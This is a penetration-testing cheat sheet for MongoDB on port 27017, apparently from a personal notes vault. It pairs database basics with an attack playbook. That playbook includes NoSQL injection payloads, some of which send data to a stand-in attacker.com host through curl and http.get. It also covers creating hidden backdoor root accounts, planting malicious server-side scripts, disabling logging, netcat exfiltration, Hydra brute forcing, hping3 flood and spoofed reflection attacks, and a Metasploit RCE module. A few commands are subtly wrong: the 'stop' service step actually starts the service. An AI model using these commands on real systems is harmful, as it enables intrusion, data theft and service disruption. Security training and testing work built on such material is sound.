# Index
- [[Ports, Protocols, and Services]]

# MongoDB

- **Port Number:** 27017 (default)
- **Protocol:** TCP
- **Service Name:** MongoDB
- **Defined in:** MongoDB documentation (not an RFC-standardized protocol)

MongoDB is a NoSQL, document-oriented database system known for its flexibility, scalability, and ease of use. It is designed to store, retrieve, and manage document-based information in a JSON-like format called BSON (Binary JSON). MongoDB uses its custom protocol over TCP to communicate between clients and servers.

## Overview of Features

- **Document-Oriented Storage:** MongoDB stores data in a flexible, schema-less format, allowing for a variety of data structures.
  
- **High Availability:** MongoDB supports replica sets, which are groups of MongoDB servers that maintain the same data set, providing redundancy and failover.
  
- **Scalability:** MongoDB can be scaled horizontally by sharding, which distributes data across multiple servers.
  
- **Indexing:** Supports various types of indexing to improve query performance, including compound, geospatial, and full-text indexes.
  
- **Aggregation:** Offers powerful aggregation capabilities that allow complex data processing and analysis within the database.

- **Flexible Schema:** MongoDB's schema-less design allows for dynamic data structures, meaning fields can vary between documents.

## Typical Use Cases

- **Big Data Applications:** Suitable for storing large volumes of unstructured or semi-structured data.
  
- **Real-Time Analytics:** Used in environments where real-time processing and analytics are critical.
  
- **Content Management Systems (CMS):** Ideal for managing large amounts of dynamic content, such as blogs, product catalogs, and user profiles.
  
- **IoT Applications:** Commonly used in Internet of Things (IoT) applications where large amounts of data are collected from numerous sources.

## How MongoDB Works

1. **Connection Establishment:**
   - **Step 1:** A MongoDB client initiates a connection to a MongoDB server on the default port 27017. 
   - **Step 2:** The server responds, establishing a TCP connection for data exchange.

2. **Authentication:**
   - **Step 3:** If authentication is enabled, the client must authenticate with the server using credentials. MongoDB supports various authentication mechanisms, including SCRAM, X.509 certificates, and Kerberos.

3. **Data Operations:**
   - **Step 4:** The client sends a query, insert, update, or delete request to the server using BSON-encoded data. The server processes the request and performs the corresponding operation on the database.
   - **Step 5:** The server returns the results of the operation to the client, also encoded in BSON format.

4. **Replication:**
   - **Step 6:** If the server is part of a replica set, it synchronizes the data with other members of the replica set to ensure consistency and redundancy.
  
5. **Sharding:**
   - **Step 7:** In a sharded cluster, the query router (mongos) directs the request to the appropriate shard(s) based on the data distribution.

6. **Connection Termination:**
   - **Step 8:** The client terminates the connection by closing the TCP socket, ending the session with the MongoDB server.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>:<attack_port>` connects to `<target_ip>:27017`
- **Server:** `<target_ip>` authenticates client and performs requested data operations.

# Additional Information

## Common MongoDB Collections

| **Collection Name** | **Description**|
|-|-|
| system.indexes  | Stores information about indexes in the database.             |
| system.users    | Stores user authentication information.                       |
| system.roles    | Stores roles and associated privileges for users.             |
| system.profile  | Stores database profiling information.                        |
| system.js       | Stores JavaScript functions that can be executed server-side. |

## Security Considerations
- **Default Open Access:** MongoDB historically defaulted to being open to external connections, which led to many instances being publicly accessible without authentication.
  
- **Data-at-Rest Encryption:** MongoDB supports data encryption at rest using the WiredTiger storage engine, but this must be explicitly configured.

- **Authentication and Authorization:** MongoDB supports role-based access control (RBAC) to manage permissions, and it is crucial to ensure proper user roles are assigned.

- **Auditing:** MongoDB includes an auditing capability to track access and operations, but this is typically disabled by default.

## Alternatives
- **CouchDB:** Another NoSQL database, CouchDB uses a similar document storage model but has different scaling and performance characteristics.
  
- **PostgreSQL with JSONB:** While PostgreSQL is a relational database, it supports JSONB data types, offering some document-oriented capabilities with the benefits of SQL.

## Advanced Usage
- **Aggregation Pipelines:** MongoDB’s aggregation framework allows for complex data transformations and calculations across multiple documents and collections.
  
- **Geospatial Queries:** MongoDB supports geospatial indexes and queries, making it suitable for location-based services.

## Modes of Operation
- **Standalone Mode:** MongoDB can operate as a single-server instance for development or small deployments.
  
- **Replica Set Mode:** For high availability, MongoDB can be configured in a replica set mode with one primary and multiple secondary nodes.

- **Sharded Cluster Mode:** For horizontal scalability, MongoDB can operate as a sharded cluster, distributing data across multiple servers.

## Configuration Files

1. **Main Configuration File:**
- **Location:** `/etc/mongod.conf` (Linux), `C:\Program Files\MongoDB\Server\4.0\bin\mongod.cfg` (Windows)
- **Example Configuration:**
    ```yaml
    # mongod.conf
    storage:
      dbPath: /var/lib/mongo
      journal:
        enabled: true
    net:
      port: 27017
      bindIp: 127.0.0.1
    security:
      authorization: enabled
    replication:
      replSetName: rs0
    sharding:
      clusterRole: shardsvr
    ```
- **Key Settings:**
  - `dbPath`: Specifies the directory where MongoDB stores its data.
  - `bindIp`: Determines the IP addresses on which MongoDB listens. The default is `127.0.0.1` (localhost), which should be changed with caution.
  - `authorization`: When enabled, enforces access control with user roles.
  - `replSetName`: Defines the name of the replica set, crucial for replication.
  - `clusterRole`: Specifies the role of the MongoDB instance in a sharded cluster (`shardsvr` or `configsvr`).

## Potential Misconfigurations

1. **No Authentication Enabled:**
   - **Risk:** Without authentication, anyone can connect to the MongoDB instance and access or modify data.
   - **Exploitation:** Attackers can query, insert, update, or delete data, or even drop entire databases.

2. **Default Bind IP:**
   - **Risk:** MongoDB binding to `0.0.0.0` exposes the service to the entire internet if not behind a firewall.
   - **Exploitation:** An attacker can remotely connect to the MongoDB instance, especially if no authentication is configured.

3. **Unencrypted Communications:**
   - **Risk:** Data in transit may be intercepted by attackers if SSL/TLS is not configured.
   - **Exploitation:** Attackers could perform man-in-the-middle (MITM) attacks, capturing sensitive data.

4. **Improper Role Assignment:**
   - **Risk:** Granting users more privileges than necessary can lead to accidental or malicious data corruption.
   - **Exploitation:** An attacker could escalate privileges by exploiting overly permissive roles.

## Default Credentials

MongoDB does not have default credentials, but in instances where authentication is not enabled, it effectively allows any connection without requiring a username or password. When authentication is enabled, administrators must create user accounts with passwords and assign appropriate roles.

# Interaction and Tools

## MongoDB
- **List Databases:** Displays a list of all databases on the MongoDB server.
    ```bash
    show dbs
    ```
- **Select Database:** Switches the context to the specified database.
    ```bash
    use <database_name>
    ```
- **List Collections in Database:**
	```bash
	show collections
	```
- **Find Document in Collection:**
	```bash
	db.<collection>.find({key: "value"})
	```
- **Insert Document into Collection:** Inserts a single document into the specified collection.
    ```bash
    db.<collection>.insert({key: "value"})
    ```
- **Update Document in Collection:**
	```bash
	db.<collection>.update({key: "value"}, {$set: {newKey: "newValue"}})
	```
- **Remove Document from Collection:**
	```bash
	db.<collection>.remove({key: "value"})
	```
- **Querying Data:** Retrieves documents from the collection that match the query criteria.
    ```bash
    db.<collection>.find({ name: "example" })
    ```
- **Insert Data:**
	```bash
	db.<collection>.insertOne({ name: "example", value: 123 })
	```
- **Create a User:**
	```bash
	db.createUser({   user: "admin",   pwd: "securePassword123",   roles: [{ role: "userAdminAnyDatabase", db: "admin" }] })
	```
- **Create Admin User:** Creates a root user with administrative privileges, enabling authentication.
```bash
mongo --eval 'db.createUser({user:"admin", pwd:"password", roles:["root"]})'
```
- **Aggregation Pipeline:** Performs a complex query that filters documents by status and groups them by customer ID, summing the amount field.
    ```bash
    db.<collection>.aggregate([
      { $match: { status: "A" } },
      { $group: { _id: "$cust_id", total: { $sum: "$amount" } } }
    ])
    ```
- **Replica Set Initialization:** Initializes a replica set on the MongoDB server, enabling replication.
    ```bash
    rs.initiate()
    ```
- **Sharding a Collection:** Enables sharding on a specific collection, distributing data across multiple shards based on the shard key.
    ```bash
    sh.shardCollection("<db>.<collection>", { "shardKey": 1 })
    ```

## NoSQL Injection
- In applications that interact with MongoDB, poorly sanitized inputs can lead to NoSQL injection, allowing attackers to manipulate database queries.

  MongoDB, as a NoSQL database, differs significantly from traditional SQL databases in structure, query language, and behavior. MongoDB doesn’t use SQL syntax, so traditional SQL Injection techniques don’t apply. However, MongoDB applications that improperly handle input data in their query operations may still be vulnerable to injection attacks. These attacks typically involve injecting malicious JavaScript or BSON (Binary JSON) code into queries, filters, or commands that MongoDB interprets and executes.

### Error-Based MongoDB Injection
- **Find Operation Error:** Causes an error in the find operation by injecting invalid BSON. Forces an error by including an invalid function (`undefined()`), which can help in understanding the error handling and possible error messages.
	```sql
	db.collection.find({ $where: "this.field == 'value' && undefined()" })
	```
- **Projection Manipulation Error:** Injecting a malformed projection to cause an error. This payload injects an invalid operator in the projection, causing a parsing error.
	```sql
	db.collection.find({}, { "field": { $invalidOperator: "" } })
	```

### Union-Based MongoDB Injection (Equivalent)
- Since MongoDB doesn't support SQL or UNION operations, there isn't a direct equivalent of Union-Based SQLi. However, aggregation pipelines can sometimes be abused similarly if the input is improperly sanitized.
- **Aggregation Pipeline Manipulation:** Injects a stage into an aggregation pipeline to alter its behavior. Manipulates the pipeline to add a potentially malicious field, concatenating values to leak information.
	```sql
	db.collection.aggregate([
	    { $match: { "field": "value" } },
	    { $group: { _id: null, total: { $sum: 1 } } },
	    { $addFields: { malicious: { $concat: ["$total", ".attacker.com"] } } }
	])
	```

### Boolean-Based MongoDB Injection
- **Boolean Condition Manipulation:** Manipulates a query with a Boolean condition to determine behavior based on true/false values. Evaluates to true for all documents, effectively bypassing authentication or access controls if the application doesn't properly handle this.
	```sql
	db.collection.find({ $where: "this.username == 'admin' || 1==1" })
	```
- **Always True Injection:** A query condition that always evaluates to true, often bypassing security checks. This will match all documents because the `$where` clause always returns true, making any prior conditions ineffective.
	```sql
	db.collection.find({ "username": { $ne: "admin" }, $where: "1 == 1" })
	```

### Time-Based MongoDB Injection
- MongoDB doesn’t have a direct equivalent to `SLEEP()` in SQL, but JavaScript execution can introduce delays.
- **JavaScript Delay Injection:** Introduces a delay in the query execution using JavaScript’s `sleep()` function. Forces a delay of 5 seconds to observe if the server’s response time is affected, confirming the vulnerability.
	```sql
	db.collection.find({ $where: "function() { sleep(5000); return true; }" })
	```
- **Conditional Delay:** Delays execution based on a condition. Causes a delay only if a specific condition is true, allowing the attacker to infer information based on the delay.
	```sql
	db.collection.find({ $where: "function() { if (this.username == 'admin') { sleep(5000); } return true; }" })
	```

### Out-of-Band MongoDB Injection
- MongoDB doesn't natively support out-of-band techniques like traditional SQL databases, but certain operations can be manipulated for OOB-like behavior if the environment is misconfigured (e.g., MongoDB running with elevated privileges and network access).
- **Command Injection with Networking:** Attempts to use MongoDB shell or system calls for out-of-band communication. If the `eval()` function is enabled (highly insecure and deprecated), this could run a shell command that communicates with an attacker-controlled server.
	```sql
	db.eval("require('child_process').exec('curl http://attacker.com/?data=' + this.field)")
	```
- **Malicious `mapReduce` Function:** Attempts to send data to an external server by exploiting a `mapReduce` operation. The map-reduce operation executes JavaScript on the server, potentially sending data to an external server.
	```sql
	db.collection.mapReduce(
	    function() { emit(this.field, null); },
	    function(key, values) {
	        require('http').get('http://attacker.com/?key=' + key);
	        return null;
	    },
	    { out: { inline: 1 } }
	)
	```

### Practical Considerations for MongoDB Injection

1. **NoSQL Nature:** MongoDB doesn’t use SQL, but it is still vulnerable to injection attacks if inputs are not sanitized, especially when applications allow direct access to query operators, JavaScript, or other MongoDB-specific commands.
2. **JSON and BSON:** MongoDB queries are written in JSON or BSON format, meaning injection payloads often target the structure of these objects rather than traditional SQL syntax.
3. **JavaScript Execution:** MongoDB’s ability to execute JavaScript on the server side (e.g., with `$where`, `eval`, or `mapReduce`) can be exploited if these features are not properly secured.
4. **Restricted Operations:** Many potentially harmful operations (e.g., `eval()`) have been deprecated or restricted in MongoDB, so attacks may require older or misconfigured versions of MongoDB.
5. **Network Security:** Out-of-band techniques require the MongoDB server to have network access and the ability to execute external commands or connect to external services. Proper network segmentation and firewall rules can mitigate these risks.

## Tools

### [[MongoShell]]
https://www.w3schools.com/mongodb/index.php
- **Start MongoDB Service:** Starts the MongoDB daemon on a Linux system.
    ```bash
    sudo systemctl start mongod
    ```
- **Stop MongoDB Service:** Stops the MongoDB daemon on a Linux system.
    ```bash
    sudo systemctl start mongod
    ```
- **Connect to MongoDB Shell Locally:** Connects to the MongoDB instance locally.
    ```bash
    mongo --host <target_ip> --port 27017
    ```
- **Connect to MongoDB Shell Remotely:** Connects to the MongoDB instance on the specified IP and port.
    ```bash
    mongo --host <target_ip> --port 27017 -u <username> -p <password> --authenticationDatabase admin
    ```
- **Backup:**
	```bash
	mongodump --host <host> --port <port> --username <username> --password <password> --out /path/to/backup
	```
- **Restore:**
```bash
mongorestore --host <host> --port <port> --username <username> --password <password> /path/to/backup
```

## [[Compass]]

## [[Mongo-Express]]

## [[Robomongo]]


## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 27017"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 27017
    ```

### [[NetCat]]
- **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 27017
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 27017 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 27017
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
	nc <target_ip> 27017 < secret_data.txt
	```

### [[SoCat Cheat Sheet]]
- **SoCat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:27017
	```

### [[HPing3 Cheat Sheet]]
- **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.
    ```bash
    hping3 <target_ip> -p 27017
    ```

### [[NoSQLMap]]
- **Run NoSQLMap:** Automated exploitation of MongoDB vulnerabilities, including injection and enumeration.
    ```bash
    nosqlmap -u "mongodb://<target_ip>:27017"
    ```

### [[MongoAudit]]
- **Scan Target:** Identifying security issues in MongoDB installations and providing remediation guidance.
    ```bash
    mongoaudit --host <target_ip>
    ```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p <target_port>
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> <target_port>
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

## Initial Access

### Exploiting No Authentication
- **Tool:** [[MongoDB]]
```bash
mongo --host <target_ip> --port 27017
```
- **Description:** Connects to the MongoDB instance without authentication (if it is open), allowing the attacker to access and manipulate the data.

### NoSQL Injection
- **Tool:** [[NoSQLMap]]
	```bash
	python nosqlmap.py -u http://<target_ip>/endpoint?param=value
	```
- **Description:** Exploits NoSQL injection vulnerabilities in web applications interacting with MongoDB.

## Persistence

### Create A SQL User Account
- **Tool:** [[MongoDB]]
	```bash
	db.createUser({user: "backdoor", pwd: "password", roles: ["root"]})
	```
- **Description:** Establishes a hidden administrative account within MongoDB for persistent access.

### Adding Malicious Scripts
- **Tool:** [[MongoDB]]
	```bash
	db.system.js.save({_id: "maliciousScript", value: function() { /* malicious code */ }})
	```
- **Description:** Stores malicious JavaScript code in the database, which can be executed later.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port 27017"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
	```bash
	bettercap -iface <interface> -T <target_ip> --proxy
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### Querying User Collections
- **Tool:** [[MongoDB]]
    ```js
    db.system.users.find()
    ```
- **Description:** Retrieves stored user credentials and roles from the MongoDB instance.

## Privilege Escalation

### Create Admin Account
- **Tool:** [[MongoDB]]
    ```js
    db.createUser({user: "hiddenAdmin", pwd: "P@ssw0rd", roles: ["root"]})
    ```
- **Description:** Establishes a hidden administrative account within MongoDB for persistent access.

### Exploiting Misconfigured Roles
- **Tool:** [[MongoDB]]
    ```js
    db.system.users.update({user: "normal_user"}, {$set: {roles: ["root"]}})
    ```
- **Description:** Modifies user roles to escalate privileges within the MongoDB instance.

### Exploiting No Authentication
- **Tool:** [[MongoDB]]
    ```js
    db.getSiblingDB("admin").runCommand({addUser: "admin", pwd: "P@ssw0rd", roles: ["root"]})
    ```
- **Description:** If no authentication is in place, directly creating a new root user account.

## Internal Reconnaissance

### Enumerating Databases
- **Tool:** [[MongoDB]]
    ```bash
    mongo --host <target_ip> --port 27017 --eval "db.adminCommand({listDatabases: 1})"
    ```
- **Description:** Lists all databases on the MongoDB server for further exploration.

### Exploring Collection Metadata
- **Tool:** [[MongoDB]]
    ```js
    db.<collection>.getIndexes()
    ```
- **Description:** Retrieves index information, which can give insight into the structure and important fields of a collection.

## Lateral Movement, Pivoting, and Tunnelling

### Pivoting through MongoDB
- **Tool:** [[SSH]]
    ```bash
    ssh -L 27018:localhost:27017 user@<jumphost_ip>
    mongo --host localhost --port 27018
    ```
- **Description:** Tunnels MongoDB traffic through SSH to gain access from another network segment.

## Defense Evasion

### Obfuscating Queries
- **Tool:** [[MongoDB]]
    ```js
    db.<collection>.find({"$where": "function() { return this.field1 == 'value' && this.field2 == 'value'; }"})
    ```
- **Description:** Uses JavaScript functions to create complex queries that are harder to detect by security monitoring tools.

### Disabling Logging
- **Tool:** [[MongoDB]]
    ```js
    db.adminCommand({setParameter: 1, logLevel: -1})
    ```
- **Description:** Reduces or disables logging to avoid detection during malicious activity.

## Data Exfiltration

### Extracting Databases
- **Tool:** [[MongoDump]]
    ```bash
    mongodump --host <target_ip> --port 27017 --out /exfil/directory
    ```
- **Description:** Dumps entire MongoDB databases for later exfiltration.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra mongodb://<target_ip> -s 27017 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra mongodb://<target_ip> -s 27017 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p 27017 --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p 27017 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### Resource Exhaustion
- **Tool:** [[MongoDB]]
    ```bash
    while(true) { db.collection.insert({ largeField: new Array(10000000).join("x") }) }
    ```

	```
    while true; do mongo --host <target_ip> --eval "db.<collection>.insertMany([...])"; done
    ```
  - **Description:** Overloads the MongoDB server by continuously inserting large volumes of data.

### Index Flooding
- **Tool:** [[MongoDB]]
	```bash
	while(true) { db.collection.createIndex({ field: 1 }) }
	```
- **Description:** Floods the MongoDB server with index creation commands, consuming CPU and memory resources.

## Exploits 

### Remote Code Execution
- **Tool:** [[MongoDB]]
	```bash
	use exploit/linux/misc/mongodb_javascript_rce
	set RHOST <target_ip>
	set RPORT 27017
	run
	```
- **Description:** Using Metasploit's `mongodb_javascript_rce` module to exploit a MongoDB instance with JavaScript execution enabled.

# Resources

|**Website**|**URL**|
|-|-|
|MongoDB Official Documentation|https://docs.mongodb.com/|
|MongoDB Security Checklist|https://docs.mongodb.com/manual/administration/security-checklist/|
|NoSQLMap GitHub Repository|https://github.com/codingo/NoSQLMap|
|Medusa Password Cracker|https://foofus.net/goons/jmk/tools/medusa/medusa.html|
|Hydra - Password Cracking Tool|https://github.com/vanhauser-thc/thc-hydra|
|MongoDB Aggregation Framework|https://docs.mongodb.com/manual/aggregation/|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|
|Nmap Reference Guide|https://nmap.org/book/man.html|
|MongoDB Compass Download|https://www.mongodb.com/products/compass|
|TCP/IP Illustrated|https://www.amazon.com/TCP-Illustrated-Volume-Implementation/dp/0201633469|